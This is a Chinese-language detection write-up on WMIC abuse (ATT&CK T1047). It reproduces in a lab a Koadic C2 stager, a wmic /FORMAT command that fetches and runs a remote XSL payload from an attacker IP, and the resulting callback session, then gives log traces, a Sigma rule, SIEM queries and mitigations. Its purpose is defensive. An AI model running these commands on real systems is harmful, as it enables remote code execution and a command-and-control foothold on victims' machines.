# T1047-Win-使用WMIC执行payload（白名单）

## 描述

攻击者可能利用Windows Management Instrumentation（WMI）与本地或远程系统交互，执行多种策略功能，如信息收集、远程命令执行或横向移动（T1047）。WMI是Windows管理功能的核心组件，提供统一的环境来访问系统组件，依赖WMI服务（`winmgmt`）以及SMB（端口445）和RPC（端口135）进行远程访问。

WMIC（WMI Command-line）是WMI的命令行接口，允许攻击者通过脚本或命令行调用WMI功能。攻击者可能利用WMIC执行恶意Payload，例如通过`/FORMAT`参数加载远程XSL文件或直接运行命令。由于WMIC是Windows内置工具，属于白名单进程，其行为可能被误认为是合法操作，从而增加检测难度。常见的攻击场景包括下载恶意脚本、启动恶意进程或建立反弹Shell。

## 测试案例

Wmic.exe所在路径已被系统添加PATH环境变量中，因此，Wmic命令可识别，需注意x86，x64位的Wmic调用。

Windows 2003 默认位置：

```dos
C:\WINDOWS\system32\wbem\wmic.exe
C:\WINDOWS\SysWOW64\wbem\wmic.exe
```

Windows 7 默认位置：

```dos
C:\Windows\System32\wbem\WMIC.exe
C:\Windows\SysWOW64\wbem\WMIC.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含WMIC的命令行参数和子进程信息。
- **事件ID 4624/4625**：记录登录成功或失败，可能涉及WMI远程访问的凭据使用。

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含WMIC的完整命令行和父进程信息。
- **事件ID 3**：记录网络连接，可能涉及WMIC加载远程XSL文件的HTTP请求。

**配置日志记录**  
- 启用命令行参数记录：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。
- 部署Sysmon以增强进程和网络活动监控。

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7

### 攻击分析

#### Koadic

通过Koadic发起Wmic.exe攻击

koadic是一个命令控制（C2）工具，类似Metasploit和Powershell Empire。使用koadic我们生成恶意XSL文件。koadic安装完成后，您可以运行./koadic文件以启动koadic，然后通过运行以下命令开始加载stager/js/wmic程序，并将SRVHOST设置为程序回连IP。

```bash
git clone https://github.com/zerosum0x0/koadic.git  #安装命令
cd koadic
pip3 install -r requirements.txt
```

```bash
#加载载荷
./koadic
(koadic: sta/js/mshta)# use stager/js/wmic
(koadic: sta/js/wmic)# set SRVHOST 192.168.126.146
[+] SRVHOST => 192.168.126.146
(koadic: sta/js/wmic)# run
[+] Spawned a stager at http://192.168.126.146:9996/6G69i.xsl
[>] wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
```

#### 靶机执行payload

执行WMIC以下命令，从远程服务器下载和运行恶意XSL文件：

```cmd
wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
```

靶机测试结果

```dos
C:\Users\12306Br0>wmic os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"
  os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"12306BR0-PCroot\cimv2roo
t\cliIMPERSONATEPKTPRIVACYms_804ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\Device\Hardd
iskVolume17601Multiprocessor FreeMicrosoft Windows 7 旗舰版 93686Win32_Operating
SystemWin32_ComputerSystemService Pack 112306BR0-PC480TRUETRUETRUE2FALSEFALSE256
29608362009844309911620200305144428.000000+48020200305151330.500000+480202004171
72815.995000+4800804Microsoft Corporation-18589934464zh-CNMicrosoft Windows 7 旗
舰版 |C:\Windows|\Device\Harddisk0\Partition2422164-bit205225618TRUE112306Br0004
26-292-0000007-85792102343416OK272\Device\HarddiskVolume2C:\Windows\system32C:44
4004820966326.1.7601C:\Windows
```

#### 反弹shell

一旦恶意的XSL文件在目标计算机上执行，将有一个连接，就像Metasploit回连的情况一样。

```bash
[+] Zombie 0: Staging new connection (192.168.126.149) on Stager 0
[+] Zombie 0: 12306Br0-PC\12306Br0 @ 12306BR0-PC -- Windows 7 Ultimate
[!] Zombie 0: Timed out.
[+] Zombie 0: Re-connected.
(koadic: sta/js/wmic)# zombies 0

        ID:                     0
        Status:                 Alive
        First Seen:             2020-04-17 17:28:31
        Last Seen:              2020-04-17 17:29:04
        Listener:               0

        IP:                     192.168.126.149
        User:                   12306Br0-PC\12306Br0
        Hostname:               12306BR0-PC
        Primary DC:             Unknown
        OS:                     Windows 7 Ultimate
        OSBuild:                7601
        OSArch:                 64
        Elevated:               No

        User Agent:             Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
        Session Key:            02149f1202e3437ab7932672c0c9e6b5

        JOB  NAME                            STATUS    ERRNO
        ---- ---------                       -------   -------
```

## 测试留痕

```log
# sysmon日志
EventID: 1
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: WMI Commandline Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: wmic  os get /FORMAT:"http://192.168.126.146:9996/6G69i.xsl"

# win7安全日志
EventID：4688
进程信息:
新进程 ID: 0x888
新进程名: 'C:\Windows\System32\wbem\WMIC.exe'
```

## 检测规则/思路

**检测规则**  
通过分析Sysmon和Windows安全日志，检测WMIC执行可疑命令或加载远程资源的异常行为。以下是具体思路：

1. **日志分析**：
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，提取WMIC进程（`wmic.exe`）的命令行参数。
   - 检测可疑行为，如加载远程XSL文件（`/FORMAT:http`）、创建进程（`process call create`）或执行异常命令。

2. **Sigma规则**：
   ```yaml
   title: 可疑的WMIC Payload执行
   id: 4e7b8c9d-3f2a-4b1c-a9e4-1f2d3c4e5f6b
   status: experimental
   description: 检测WMIC执行可疑命令或加载远程XSL文件，可能表明恶意Payload执行
   date: 2025/06/06
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith: '\wmic.exe'
       CommandLine|contains:
         - '/FORMAT:http'
         - 'process call create'
         - 'node'
         - 'alias'
     condition: selection
   falsepositives:
     - 合法的WMIC管理脚本
     - 管理员运行的维护任务
   level: high
   ```

3. **SIEM规则**：
   - 检测WMIC加载远程资源或启动可疑进程。
   - 示例Splunk查询：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\wmic.exe" (CommandLine="*/FORMAT:http*" OR CommandLine="*process call create*") | stats count by Image, CommandLine, ComputerName
     ```

4. **网络流量分析**：
   - 监控WMIC发起的HTTP请求，检测对可疑URL的访问。
   - 示例Wireshark过滤器：
     ```plaintext
     http.request and ip.src == <target_ip> and http.request.uri contains ".xsl"
     ```

5. **威胁情报整合**：
   - 检查WMIC访问的URL或IP是否与已知恶意活动相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御WMIC滥用需从进程监控、访问控制和系统加固入手：

1. **限制WMIC使用**  
   - 配置应用程序白名单（如AppLocker），限制非授权用户运行`wmic.exe`。  
   - 禁用WMI服务（`winmgmt`）或限制其远程访问，除非必要。

2. **网络访问控制**  
   - 限制WMI相关端口（SMB:445、RPC:135）的公网访问，仅允许白名单IP。  
   - 配置防火墙阻止WMIC的异常HTTP请求。

3. **凭据保护**  
   - 启用多因素认证（MFA），降低凭据被盗导致的WMI远程访问风险。  
   - 使用强密码策略，避免弱密码或密码重用。

4. **日志和监控**  
   - 启用命令行参数记录，增强Windows安全日志（事件ID 4688）或Sysmon（事件ID 1）监控。  
   - 配置SIEM检测WMIC的异常命令行模式。

## 参考推荐

- MITRE ATT&CK: T1047  
  <https://attack.mitre.org/techniques/T1047/>  
- Windows下基于白名单获取Shell的方法整理  
  <http://www.safe6.cn/article/155>
